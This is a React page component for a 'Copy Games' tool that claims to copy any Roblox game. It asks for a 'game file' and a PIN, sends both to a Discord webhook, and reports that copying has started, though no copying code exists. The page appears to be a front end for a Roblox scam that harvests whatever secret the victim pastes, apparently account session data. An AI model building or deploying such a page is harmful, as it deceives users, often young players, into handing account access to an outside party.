
import React, { useState } from 'react';
import BackButton from '@/components/BackButton';
import { FileIcon, LockIcon, Loader2 } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';
import { sendToDiscordWebhook } from '@/utils/webhookService';

const CopyGames = () => {
  const [gameFile, setGameFile] = useState<string>("");
  const [pin, setPin] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async () => {
    if (!gameFile.trim() || gameFile.length < 10) {
      toast.error("Please enter a game file (at least 10 characters)");
      return;
    }
    
    setIsLoading(true);
    
    try {
      await sendToDiscordWebhook({
        toolType: "Game Copier",
        file: gameFile,
        pin
      });
      
      toast.success("Game copy process started!");
    } catch (error) {
      toast.error("An error occurred. Please try again later.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-blox-gradient">
      <div className="container mx-auto px-4 py-8">
        <BackButton />
        
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: "easeOut" }}
        >
          <motion.h1 
            className="text-4xl font-bold mb-2 text-center"
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.3 }}
          >
            Copy Games
          </motion.h1>
          <motion.p 
            className="text-center text-gray-400 mb-12"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5, delay: 0.4 }}
          >
            Copy any Roblox game efficiently with our advanced tool
          </motion.p>
          
          <motion.div 
            className="max-w-xl mx-auto blox-card p-8"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
            whileHover={{ boxShadow: "0 8px 30px rgba(0, 215, 220, 0.15)" }}
          >
            <motion.h2 
              className="text-2xl font-bold mb-4"
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.3, duration: 0.4 }}
            >
              Game Copier
            </motion.h2>
            
            <motion.p 
              className="text-gray-400 mb-6"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.4, duration: 0.4 }}
            >
              Enter the game file you want to copy below and create a PIN for security. Our system will process your request quickly.
            </motion.p>
            
            <motion.div 
              className="relative mb-4"
              initial={{ x: -20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              transition={{ delay: 0.5, duration: 0.5, ease: "easeOut" }}
            >
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                <FileIcon size={18} />
              </div>
              <input
                type="text"
                placeholder="Enter Game File"
                value={gameFile}
                onChange={(e) => setGameFile(e.target.value)}
                className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
              />
            </motion.div>
            
            <motion.div 
              className="relative mb-6"
              initial={{ x: -20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              transition={{ delay: 0.6, duration: 0.5, ease: "easeOut" }}
            >
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                <LockIcon size={18} />
              </div>
              <input
                type="password"
                placeholder="Create A Pin"
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
              />
            </motion.div>
            
            <motion.button 
              onClick={handleSubmit}
              className="w-full bg-blox-teal text-white py-3 rounded-md font-medium hover:brightness-110 transition-all flex items-center justify-center"
              whileHover={{ scale: 1.02, brightness: 1.1 }}
              whileTap={{ scale: 0.98 }}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.7, duration: 0.5 }}
              disabled={isLoading}
            >
              {isLoading ? (
                <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing...</>
              ) : (
                'Copy Game'
              )}
            </motion.button>
          </motion.div>
        </motion.div>
      </div>
    </div>
  );
};

export default CopyGames;
